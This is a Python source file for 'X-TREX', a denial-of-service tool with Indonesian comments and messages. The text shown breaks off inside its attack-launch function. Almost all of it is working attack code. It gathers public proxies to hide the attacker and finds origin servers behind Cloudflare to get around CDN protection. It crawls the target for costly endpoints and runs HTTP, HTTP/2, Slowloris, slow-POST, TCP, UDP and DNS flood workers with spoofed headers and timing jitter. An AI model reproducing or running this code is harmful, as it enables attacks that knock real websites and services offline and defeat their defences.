#!/usr/bin/env python3
# language: Python 3, file: xtrex.py, runtime: Termux / Linux / macOS
# X-TREX v1.1 — single file, stdlib only, zero import errors.
# Semua fitur aktif: 8 vektor, proxy auto-heal, endpoint hunter, origin finder.

import os, sys, json, time, socket, ssl, struct, random, string, threading, re, ipaddress
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
from urllib.parse import urlparse, urljoin

# ═══════════════════════════════════════════════════════════════════
# WARNA
# ═══════════════════════════════════════════════════════════════════
class C:
    R="\033[0m"; B="\033[1m"; D="\033[2m"
    G="\033[92m"; Cy="\033[96m"; Y="\033[93m"
    Rd="\033[91m"; Mg="\033[95m"; Bl="\033[94m"; W="\033[97m"

# ═══════════════════════════════════════════════════════════════════
# PATHS & CONFIG
# ═══════════════════════════════════════════════════════════════════
BASE         = os.path.dirname(os.path.abspath(__file__))
CFG_FILE     = os.path.join(BASE, "xtrex.json")
PROXY_CACHE  = os.path.join(BASE, "xtrex-proxies.txt")
ENDPOINT_FILE= os.path.join(BASE, "xtrex-endpoints.txt")
LOG_DIR      = os.path.join(BASE, "xtrex-logs")

DEFAULTS = {
    "host": "", "port": 80, "tls": False, "path": "/",
    "threads": 50, "duration": 60,
    "use_proxies": True, "use_endpoints": True,
    "stealth": False, "stealth_min_ms": 20, "stealth_max_ms": 200,
    "udp_size": 1200, "payload_mode": "rand",
    "profile": "default",
}
CFG = dict(DEFAULTS)


def _ensure_dirs():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception:
        pass


def load_cfg():
    global CFG
    if not os.path.exists(CFG_FILE):
        return
    try:
        with open(CFG_FILE) as f:
            data = json.load(f)
        active = data.get("active", "default")
        prof = data.get("profiles", {}).get(active, {})
        for k in DEFAULTS:
            if k in prof:
                CFG[k] = prof[k]
        CFG["profile"] = active
    except Exception:
        pass


def save_cfg():
    try:
        _ensure_dirs()
        active = CFG.get("profile", "default")
        profiles = {}
        if os.path.exists(CFG_FILE):
            try:
                with open(CFG_FILE) as f:
                    profiles = json.load(f).get("profiles", {})
            except Exception:
                profiles = {}
        profiles[active] = {k: v for k, v in CFG.items() if k != "profile"}
        with open(CFG_FILE, "w") as f:
            json.dump({"active": active, "profiles": profiles}, f, indent=2)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════
# UTILS
# ═══════════════════════════════════════════════════════════════════
def rstr(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def log_session(line):
    try:
        _ensure_dirs()
        path = os.path.join(LOG_DIR, time.strftime("%Y-%m-%d.log"))
        with open(path, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def parse_url(s):
    s = (s or "").strip()
    if not s:
        return "", 80, False, "/"
    if "://" not in s:
        if ":" in s:
            h, p = s.rsplit(":", 1)
            if p.isdigit():
                return h, int(p), int(p) == 443, "/"
        return s, 80, False, "/"
    try:
        p = urlparse(s)
        host = p.hostname or p.netloc
        tls = p.scheme == "https"
        port = p.port or (443 if tls else 80)
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
        return host, port, tls, path
    except Exception:
        return s, 80, False, "/"


def resolve(host):
    if not host:
        return []
    try:
        return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET)})
    except Exception:
        try:
            return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET6)})
        except Exception:
            return []


def _http_get(url, timeout=15):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 X-TREX"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception:
        return ""

# ═══════════════════════════════════════════════════════════════════
# PROXY — blacklist + scrape + health check
# ═══════════════════════════════════════════════════════════════════
PROXY_BLACKLIST = set()
PROXY_BL_LOCK = threading.Lock()


def proxy_is_dead(p):
    with PROXY_BL_LOCK:
        return p in PROXY_BLACKLIST


def proxy_mark_dead(p):
    with PROXY_BL_LOCK:
        PROXY_BLACKLIST.add(p)


def proxy_live_pool(proxies):
    return [p for p in proxies if not proxy_is_dead(p)]


def proxy_clear_blacklist():
    with PROXY_BL_LOCK:
        PROXY_BLACKLIST.clear()


PROXY_SOURCES = [
    ("http",   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("http",   "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
    ("http",   "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt"),
    ("http",   "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"),
    ("http",   "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"),
    ("socks5", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"),
    ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
    ("socks5", "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt"),
    ("socks5", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
]


def scrape_proxies(verbose=True):
    seen = set()
    out = []
    for kind, url in PROXY_SOURCES:
        if verbose:
            sys.stdout.write(f"\r  {C.D}scrape {kind}: {url.split('/')[-1][:35]:<35}{C.R}  ")
            sys.stdout.flush()
        text = _http_get(url)
        if not text:
            continue
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "://" in line:
                line = line.split("://", 1)[1]
            if ":" not in line:
                continue
            try:
                h, p = line.rsplit(":", 1)
                p = int(p)
                if not (1 <= p <= 65535):
                    continue
                if not h or len(h) > 100:
                    continue
                key = f"{kind}://{h}:{p}"
                if key in seen:
                    continue
                seen.add(key)
                out.append((kind, h, p))
            except Exception:
                continue
    if verbose:
        print(f"\r  {C.G}»  {len(out)} proxy mentah{C.R}                                        ")
    return out


def check_proxy(proxy, timeout=4):
    """End-to-end test — SOCKS5 greeting + CONNECT ke 1.1.1.1:443."""
    kind, host, port = proxy
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        if kind == "socks5":
            sock.sendall(b"\x05\x01\x00")
            r = sock.recv(2)
            if r != b"\x05\x00":
                return False
            sock.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("1.1.1.1") + (443).to_bytes(2, "big"))
            r = sock.recv(10)
            if len(r) < 2 or r[1] != 0:
                return False
            return True
        else:
            sock.sendall(b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n\r\n")
            r = sock.recv(128)
            if not r:
                return False
            first = r.split(b"\r\n")[0]
            return b"200" in first
    except Exception:
        return False
    finally:
        if sock:
            try: sock.close()
            except Exception: pass


def check_proxies_parallel(proxies, workers=60, verbose=True):
    if not proxies:
        return []
    alive = []
    total = len(proxies)
    done = 0
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(check_proxy, p): p for p in proxies}
            for f in as_completed(futs):
                done += 1
                try:
                    if f.result():
                        alive.append(futs[f])
                except Exception:
                    pass
                if verbose and done % 25 == 0:
                    sys.stdout.write(
                        f"\r  {C.D}cek {done}/{total}  hidup {C.G}{len(alive)}{C.R}  "
                    )
                    sys.stdout.flush()
    except Exception:
        pass
    if verbose:
        print(f"\r  {C.G}»  {len(alive)}/{total} proxy hidup{C.R}                                        ")
    return alive


def save_proxies(proxies):
    try:
        with open(PROXY_CACHE, "w") as f:
            f.write(f"# X-TREX proxy cache — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for kind, h, p in proxies:
                f.write(f"{kind}://{h}:{p}\n")
    except Exception:
        pass


def load_proxies_cached():
    out = []
    if not os.path.exists(PROXY_CACHE):
        return out
    try:
        with open(PROXY_CACHE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "://" in line:
                    kind, rest = line.split("://", 1)
                    if ":" in rest:
                        h, p = rest.rsplit(":", 1)
                        try:
                            out.append((kind, h, int(p)))
                        except Exception:
                            pass
    except Exception:
        pass
    return out


def get_proxies(force_refresh=False, verbose=True):
    if not force_refresh:
        cached = load_proxies_cached()
        if cached:
            if verbose:
                print(f"  {C.D}cache: {len(cached)} proxy, cek hidup…{C.R}")
            return check_proxies_parallel(cached, verbose=verbose)
    if verbose:
        print(f"  {C.D}scraping sumber proxy publik…{C.R}")
    raw = scrape_proxies(verbose=verbose)
    if not raw:
        return []
    if verbose:
        print(f"  {C.D}tes {len(raw)} proxy (60 thread)…{C.R}")
    alive = check_proxies_parallel(raw, verbose=verbose)
    if alive:
        save_proxies(alive)
    return alive

# ═══════════════════════════════════════════════════════════════════
# ORIGIN FINDER
# ═══════════════════════════════════════════════════════════════════
CF_RANGES = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
]
CF_NET = []
for _r in CF_RANGES:
    try:
        CF_NET.append(ipaddress.ip_network(_r))
    except Exception:
        pass


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
        return any(a in n for n in CF_NET)
    except Exception:
        return False


def find_origin(domain, verbose=True):
    if verbose:
        sys.stdout.write(f"\r  {C.D}query crt.sh…{C.R}                              ")
        sys.stdout.flush()
    subs = set()
    text = _http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=25)
    if text:
        try:
            for entry in json.loads(text):
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lower().lstrip("*.")
                    if name and name.endswith(domain):
                        subs.add(name)
        except Exception:
            pass
    for pfx in ("direct", "origin", "ftp", "mail", "smtp", "vpn",
                "dev", "staging", "stage", "test", "beta", "admin",
                "ssh", "api", "app", "backend", "old", "new", "server"):
        subs.add(f"{pfx}.{domain}")
    subs.add(domain)

    non_cf = {}
    cf = {}
    total = len(subs)
    done = 0
    for sub in subs:
        done += 1
        if verbose and done % 5 == 0:
            sys.stdout.write(
                f"\r  {C.D}resolve {done}/{total}  non-CF: {len(non_cf)}{C.R}          "
            )
            sys.stdout.flush()
        for ip in resolve(sub):
            if is_cf(ip):
                cf[sub] = ip
            else:
                non_cf.setdefault(sub, []).append(ip)
    if verbose:
        print(f"\r  {C.G}»  {len(non_cf)} host non-CF, {len(cf)} via CF{C.R}                    ")
    return non_cf, cf

# ═══════════════════════════════════════════════════════════════════
# ENDPOINT HUNTER
# ═══════════════════════════════════════════════════════════════════
SKOR_KW = {
    "login":10,"signin":10,"auth":10,"oauth":10,"register":9,"signup":9,
    "password":8,"reset":8,"verify":8,"otp":8,"2fa":8,"token":7,
    "search":9,"query":8,"find":7,"filter":7,"lookup":6,
    "export":10,"download":9,"render":9,"generate":9,"pdf":9,"csv":8,
    "zip":8,"image":6,"resize":6,"compress":7,"convert":6,
    "graphql":10,"api":6,"rpc":7,"batch":8,"bulk":8,"upload":8,
    "webhook":7,"checkout":8,"payment":9,"order":7,"cart":6,
    "admin":7,"dashboard":6,"panel":6,"preview":6,"proxy":8,
}
SKOR_NEG = {
    ".css":-3,".js":-3,".png":-3,".jpg":-3,".jpeg":-3,".gif":-3,
    ".svg":-3,".ico":-3,".woff":-3,".woff2":-3,".ttf":-3,".map":-3,
    "/static/":-2,"/assets/":-2,"/cdn-cgi/":-5,"favicon":-3,
}


def skor_path(path, has_query=False):
    s = 0
    p = path.lower()
    for kw, v in SKOR_KW.items():
        if kw in p:
            s += v
    for kw, v in SKOR_NEG.items():
        if kw in p:
            s += v
    if has_query:
        s += 3
    if p in ("/", "", "/index.html", "/index.php"):
        s -= 3
    if len(path) > 60:
        s += 2
    return s


RE_HREF   = re.compile(r'href=["\']([^"\']+)["\']', re.I)
RE_ACTION = re.compile(r'action=["\']([^"\']+)["\']', re.I)
RE_SRC    = re.compile(r'src=["\']([^"\']+)["\']', re.I)
RE_FETCH  = re.compile(r'fetch\(["\']([^"\']+)["\']', re.I)
RE_AXIOS  = re.compile(r'axios\.\w+\(["\']([^"\']+)["\']', re.I)
RE_APIP   = re.compile(r'["\'](/api/[^"\']+|/v\d+/[^"\']+)["\']', re.I)
RE_SMLOC  = re.compile(r'<loc>([^<]+)</loc>', re.I)


def _fetch_hunt(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 X-TREX-Hunt",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        })
        ctx = ssl._create_unverified_context()
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read(2_000_000).decode("utf-8", "ignore"), r.status
    except Exception:
        return "", 0


def hunt_endpoints(host, tls, verbose=True, max_pages=25):
    base = f"{'https' if tls else 'http'}://{host}"
    skor_map = {}
    seen = set()
    queue = deque([base + "/"])

    if verbose:
        sys.stdout.write(f"\r  {C.D}ambil sitemap + robots…{C.R}                    ")
        sys.stdout.flush()

    for sm in ("/sitemap.xml", "/sitemap_index.xml", "/robots.txt"):
        body, st = _fetch_hunt(base + sm)
        if st == 200 and body:
            if sm.endswith(".xml"):
                for loc in RE_SMLOC.findall(body):
                    queue.append(loc.strip())
            else:
                for line in body.splitlines():
                    if line.lower().startswith("sitemap:"):
                        sb, sst = _fetch_hunt(line.split(":", 1)[1].strip())
                        if sst == 200:
                            for loc in RE_SMLOC.findall(sb):
                                queue.append(loc.strip())

    if verbose:
        sys.stdout.write(f"\r  {C.D}crawl {max_pages} halaman…{C.R}                    ")
        sys.stdout.flush()

    visited = 0
    while queue and visited < max_pages:
        url = queue.popleft()
        if url in seen:
            continue
        seen.add(url)
        visited += 1
        body, st = _fetch_hunt(url)
        if not body or st >= 400:
            continue
        urls = set()
        for rx in (RE_HREF, RE_ACTION, RE_SRC, RE_FETCH, RE_AXIOS, RE_APIP):
            for m in rx.findall(body):
                try:
                    urls.add(urljoin(url, m.strip()))
                except Exception:
                    pass
        for u in urls:
            if u not in seen and len(seen) < 1500:
                queue.append(u)
        p = urlparse(url)
        if p.netloc == host:
            path = p.path + ("?" + p.query if p.query else "")
            sc = skor_path(p.path, bool(p.query))
            if sc > 0:
                skor_map[path] = max(skor_map.get(path, 0), sc)

    probes = ["/api", "/api/v1", "/graphql", "/api/graphql",
              "/api/login", "/api/search", "/api/users", "/search",
              "/login", "/register", "/download", "/export", "/admin"]
    for pth in probes:
        body, st = _fetch_hunt(base + pth, timeout=3)
        if st and st != 404:
            sc = skor_path(pth) + 3
            skor_map[pth] = max(skor_map.get(pth, 0), sc)

    hasil = sorted(skor_map.items(), key=lambda x: x[1], reverse=True)
    if verbose:
        print(f"\r  {C.G}»  {len(hasil)} endpoint diskor{C.R}                    ")
    return hasil


def save_endpoints(host, hasil):
    try:
        with open(ENDPOINT_FILE, "w") as f:
            f.write(f"# X-TREX endpoints — {host} — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for p, sc in hasil:
                f.write(f"{sc}|{p}\n")
    except Exception:
        pass


def load_endpoints(top=10):
    out = []
    if not os.path.exists(ENDPOINT_FILE):
        return out
    try:
        with open(ENDPOINT_FILE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    _, p = line.split("|", 1)
                    out.append(p.strip())
                else:
                    out.append(line)
    except Exception:
        return []
    return out[:top] if top else out

# ═══════════════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.pkts = self.bytes = self.ok = self.fail = 0
        self.errors = deque(maxlen=8)
        self.stop = threading.Event()
        self.th = None

    def reset(self):
        with self.lock:
            self.pkts = self.bytes = self.ok = self.fail = 0
            self.errors.clear()

    def bump(self, n, ok=True, e=None):
        with self.lock:
            self.pkts += 1
            self.bytes += n
            if ok:
                self.ok += 1
            else:
                self.fail += 1
                if e is not None:
                    s = f"{type(e).__name__}: {e}"
                    if s not in self.errors:
                        self.errors.append(s)

    def snap(self):
        with self.lock:
            return {"p": self.pkts, "b": self.bytes,
                    "o": self.ok, "f": self.fail, "e": list(self.errors)}

    def start_print(self):
        self.stop.clear()
        def loop():
            lp = lb = 0
            lt = time.time()
            while not self.stop.is_set():
                time.sleep(1)
                now = time.time()
                s = self.snap()
                pps = s["p"] - lp
                bps = (s["b"] - lb) * 8 / max(now - lt, 0.001)
                tot = s["o"] + s["f"]
                rasio = (s["o"] / max(tot, 1)) * 100
                sys.stdout.write(
                    f"\r  {C.Cy}▶{C.R} {pps:>6} pkt/s  {bps/1e6:>6.2f} Mbps  "
                    f"total {s['p']:>9}  ok {C.G}{s['o']}{C.R}  "
                    f"fail {C.Rd}{s['f']}{C.R}  rasio {C.Y}{rasio:>5.1f}%{C.R}  "
                )
                sys.stdout.flush()
                lp, lb, lt = s["p"], s["b"], now
        self.th = threading.Thread(target=loop, daemon=True)
        self.th.start()

    def stop_print(self):
        self.stop.set()
        if self.th:
            self.th.join(timeout=2)
        print()

# ═══════════════════════════════════════════════════════════════════
# CONTEXT
# ═══════════════════════════════════════════════════════════════════
class Ctx:
    def __init__(self, cfg, ips, proxies, endpoints, stats, stop):
        self.cfg = cfg
        self.ips = ips
        self.proxies = proxies
        self.endpoints = endpoints
        self.stats = stats
        self.stop = stop

    def jitter(self):
        if not self.cfg.get("stealth"):
            return
        lo = self.cfg.get("stealth_min_ms", 20) / 1000.0
        hi = self.cfg.get("stealth_max_ms", 200) / 1000.0
        try:
            time.sleep(random.uniform(lo, hi))
        except Exception:
            pass

    def pick_path(self):
        if self.endpoints:
            return random.choice(self.endpoints)
        return self.cfg["path"]

# ═══════════════════════════════════════════════════════════════════
# UA & REF
# ═══════════════════════════════════════════════════════════════════
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]
REFS = ["https://www.google.com/", "https://www.bing.com/",
        "https://duckduckgo.com/", "https://t.co/", "https://www.facebook.com/"]

# ═══════════════════════════════════════════════════════════════════
# NETWORK
# ═══════════════════════════════════════════════════════════════════
def direct_connect(ip, port, tls, host, timeout=6):
    sock = socket.create_connection((ip, port), timeout=timeout)
    if tls:
        ctx = ssl._create_unverified_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def via_proxy(proxy, host, port, tls, timeout=8, alpn=None):
    kind, ph, pp = proxy
    sock = socket.create_connection((ph, pp), timeout=timeout)
    sock.settimeout(timeout)
    if kind == "http":
        sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
        resp = sock.recv(1024)
        if not resp or b"200" not in resp.split(b"\r\n")[0]:
            sock.close()
            raise ConnectionError("http proxy refused")
        if tls:
            ctx = ssl._create_unverified_context()
            if alpn:
                try: ctx.set_alpn_protocols(alpn)
                except Exception: pass
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    if kind == "socks5":
        sock.sendall(b"\x05\x01\x00")
        greeting = sock.recv(2)
        if greeting == b"\x05\x02":
            sock.close()
            raise ConnectionError("socks5 requires auth")
        if greeting != b"\x05\x00":
            sock.close()
            raise ConnectionError("socks5 bad greeting")
        hb = host.encode()
        sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + port.to_bytes(2, "big"))
        resp = sock.recv(10)
        if len(resp) < 2 or resp[1] != 0:
            sock.close()
            raise ConnectionError(f"socks5 connect rc={resp[1] if len(resp) > 1 else -1}")
        if tls:
            ctx = ssl._create_unverified_context()
            if alpn:
                try: ctx.set_alpn_protocols(alpn)
                except Exception: pass
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    sock.close()
    raise ValueError(f"unknown proxy kind {kind}")


def _connect_target(ctx, alpn=None):
    """Proxy dulu, fallback direct. Proxy mati masuk blacklist otomatis."""
    cfg = ctx.cfg
    if ctx.proxies:
        pool = proxy_live_pool(ctx.proxies)
        if pool:
            proxy = random.choice(pool)
            try:
                return via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"], alpn=alpn), "proxy"
            except Exception:
                proxy_mark_dead(proxy)
    ip = random.choice(ctx.ips)
    return direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"]), "direct"


def build_http_request(ctx):
    cfg = ctx.cfg
    path = ctx.pick_path()
    sep = "&" if "?" in path else "?"
    method = random.choice(["GET", "GET", "GET", "HEAD", "POST"])
    body = b""
    if method == "POST":
        mode = cfg.get("payload_mode", "rand")
        size = min(cfg.get("udp_size", 1024), 4096)
        if mode == "json":
            body = b'{"k":"' + rstr(max(2, size // 2)).encode() + b'"}'
        elif mode == "form":
            body = b"k=" + rstr(max(2, size // 2)).encode()
        else:
            body = os.urandom(size)
    hdr = (
        f"{method} {path}{sep}{rstr(8)}={rstr(12)} HTTP/1.1\r\n"
        f"Host: {cfg['host']}\r\n"
        f"User-Agent: {random.choice(UA_POOL)}\r\n"
        f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Referer: {random.choice(REFS)}\r\n"
        f"Connection: close\r\n"
        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
        f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
        f"Cookie: s={rstr(24)}; _ga=GA{rstr(10)}\r\n"
    ).encode()
    if body:
        ct = "application/json" if cfg.get("payload_mode") == "json" else "application/x-www-form-urlencoded"
        hdr += f"Content-Type: {ct}\r\nContent-Length: {len(body)}\r\n".encode()
    hdr += b"\r\n" + body
    return hdr

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════
def worker_http(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            req = build_http_request(ctx)
            s.sendall(req)
            ctx.stats.bump(len(req), True)
            try: s.recv(512)
            except Exception: pass
            s.close()
            ctx.jitter()
        except Exception as e:
            ctx.stats.bump(0, False, e)


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def _h2_frame(t, flags, sid, payload):
    return (len(payload).to_bytes(3, "big") + bytes([t, flags]) +
            struct.pack("!I", sid & 0x7FFFFFFF) + payload)

def _h2_lit(i, v):
    b = v.encode()
    return bytes([i]) + bytes([len(b)]) + b

def _h2_new(n, v):
    nb = n.encode(); vb = v.encode()
    return b"\x00" + bytes([len(nb)]) + nb + bytes([len(vb)]) + vb

def _h2_block(ctx):
    path = ctx.pick_path()
    sep = "&" if "?" in path else "?"
    b = b""
    b += _h2_lit(2, "GET"); b += _h2_lit(7, "https")
    b += _h2_lit(4, path + sep + rstr(8))
    b += _h2_lit(1, ctx.cfg["host"])
    b += _h2_new("user-agent", random.choice(UA_POOL))
    b += _h2_new("x-forwarded-for",
                 f"{random.randint(1,255)}.{random.randint(0,255)}."
                 f"{random.randint(0,255)}.{random.randint(0,255)}")
    b += _h2_new("cookie", "s=" + rstr(24))
    return b


def worker_h2(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx, alpn=["h2"])
            if s.selected_alpn_protocol() != "h2":
                try: s.close()
                except Exception: pass
                continue
            s.sendall(H2_PREFACE + _h2_frame(0x4, 0x0, 0, b""))
            ctx.stats.bump(len(H2_PREFACE) + 9, True)
            for i in range(random.randint(15, 40)):
                if ctx.stop.is_set():
                    break
                sid = 1 + 2 * random.randint(1, 0x3FFFFFF)
                blk = _h2_block(ctx)
                s.sendall(_h2_frame(0x1, 0x5, sid, blk))
                ctx.stats.bump(9 + len(blk), True)
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)


def worker_slow(ctx):
    cfg = ctx.cfg
    pool = []
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            path = ctx.pick_path()
            sep = "&" if "?" in path else "?"
            s.sendall(
                f"GET {path}{sep}{rstr(6)} HTTP/1.1\r\n"
                f"Host: {cfg['host']}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n".encode()
            )
            pool.append(s)
            ctx.stats.bump(64, True)
        except Exception as e:
            ctx.stats.bump(0, False, e)
        for s in list(pool):
            try:
                s.sendall(f"X-{rstr(4)}: {rstr(random.randint(5, 15))}\r\n".encode())
                ctx.stats.bump(20, True)
            except Exception:
                try: pool.remove(s)
                except ValueError: pass
        if len(pool) > 50:
            for s in pool[:20]:
                try: s.close()
                except Exception: pass
                try: pool.remove(s)
                except ValueError: pass
        time.sleep(random.uniform(2, 5))


def worker_ruddy(ctx):
    cfg = ctx.cfg
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            path = ctx.pick_path()
            total = random.randint(200_000, 800_000)
            s.sendall(
                f"POST {path} HTTP/1.1\r\nHost: {cfg['host']}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {total}\r\nConnection: keep-alive\r\n\r\n".encode()
            )
            ctx.stats.bump(160, True)
            sent = 0
            while sent < total and not ctx.stop.is_set():
                chunk = os.urandom(random.randint(1, 8))
                s.sendall(chunk)
                ctx.stats.bump(len(chunk), True)
                sent += len(chunk)
                time.sleep(random.uniform(0.4, 1.6))
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)
            time.sleep(0.8)


def worker_tcp(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            s.sendall(b"\x00" * 64)
            ctx.stats.bump(64, True)
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)


def worker_udp(ctx):
    cfg = ctx.cfg
    while not ctx.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            body = os.urandom(cfg.get("udp_size", 1200))
            s.sendto(body, (random.choice(ctx.ips), cfg["port"]))
            s.close()
            ctx.stats.bump(len(body), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


def _dns_pkt():
    tx = random.randint(0, 0xFFFF).to_bytes(2, "big")
    hdr = tx + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
    qn = b""
    for _ in range(random.randint(3, 5)):
        seg = rstr(random.choice([2, 3])).lower().encode()
        qn += bytes([len(seg)]) + seg
    qn += b"\x00"
    return hdr + qn + random.choice([b"\x00\x01", b"\x00\xff"]) + b"\x00\x01"


def worker_dns(ctx):
    cfg = ctx.cfg
    while not ctx.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            pkt = _dns_pkt()
            s.sendto(pkt, (random.choice(ctx.ips), cfg["port"]))
            s.close()
            ctx.stats.bump(len(pkt), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


WORKERS = {
    "http": worker_http, "h2": worker_h2, "slow": worker_slow,
    "ruddy": worker_ruddy, "tcp": worker_tcp, "udp": worker_udp,
    "dns": worker_dns,
}


def pick_worker(name, ctx):
    if name in WORKERS:
        return threading.Thread(target=WORKERS[name], args=(ctx,), daemon=True)
    if name == "mixed":
        return pick_worker(random.choice(list(WORKERS.keys())), ctx)
    raise ValueError(f"vektor tidak dikenal: {name}")

# ═══════════════════════════════════════════════════════════════════
# FIRE — orkestrasi satu sesi flood
# ═══════════════════════════════════════════════════════════════════
def fire(sess, metode):
    cfg = sess["cfg"]
    if not cfg["host"]:
        print(f"  {C.Rd}[!] target kosong{C.R}")
        input(f"  {C.D}enter…{C.R}"); return

    print(f"\n  {C.D}resolve {cfg['host']}…{C.R}")
    ips = resolve(cfg["host"])
    if not ips:
        print(f"  {C.Rd}[!] gagal resolve — cek jaringan{C.R}")
        input(f"  {C.D}enter…{C.R}"); return
    print(f"  {C.G}»  {len(ips)} IP: {', '.join(ips[:4])}{' …' if len(ips) > 4 else ''}{C.R}")

    proxies = []
    if cfg.get("use_proxies"):
        print()
        proxies = get_proxies()
        if not proxies:
            print(f"  {C.Y}[!] proxy kosong — flood direct dari IP lokal{C.R}")
        else:
            proxy_clear_blacklist()

    endpoints = []
    if cfg.get("use_endpoints") and os.path.exists(ENDPOINT_FILE):
        endpoints = load_endpoints(top=10)
        if endpoints:
            print(f"  {C.G}»  {len(endpoints)} endpoint mahal di-load{C.R}")

    stats = Stats()
    stop = threading.Event()
    ctx = Ctx(cfg, ips, proxies, endpoints, stats, stop)

    cls()
    print(C.Cy + C.B + f"""
  ╔══════════════════════════════════════════════════════╗
  ║   X-TREX ACTIVE — {metode.upper():<10} — {cfg['host'][:20]:<20}   ║
  ╚══════════════════════════════════════════════════════╝""" + C.R)
